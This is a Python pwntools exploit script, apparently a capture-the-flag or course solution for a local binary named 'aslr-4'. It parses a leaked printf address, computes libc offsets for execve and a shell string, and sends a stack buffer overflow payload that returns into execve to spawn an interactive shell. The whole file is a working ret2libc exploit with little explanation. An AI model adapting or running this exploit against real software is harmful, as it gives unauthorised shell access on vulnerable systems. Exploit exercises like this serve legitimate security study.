#!/usr/bin/env python
from pwn import *

p= process("./aslr-4")

# No for your buffer, but I will let you know the address of printf 0xb7dda670
#  Please type your name:
output = p.recvline()
print(output)

words = output.split(' ')
this_printf_addr = int(words[-1],16)

# gdb -> b main -> r
execve = 0xb7eb87e0
sh = 0xb7f63a10
printf = 0xb7e51670

# offset from printf of execve:
# execve_offset = execve - printf
execve_offset = 0xb7eb87e0 - 0xb7e51670

# offset from printf of sh:
# sh_offset = sh -printf
sh_offset = 0xb7f63a10 - 0xb7e51670

# this_execve_addr = this_printf_addr + execve_offset
this_execve_addr = this_printf_addr + execve_offset

# this_sh_addr = this_printf_addr + sh_offset
this_sh_addr= this_printf_addr + sh_offset

string = "A"*0x8C + p32(this_execve_addr) + "AAAA" + p32(this_sh_addr) + p32(0)+ p32(0)

p.sendline(string)

p.interactive()

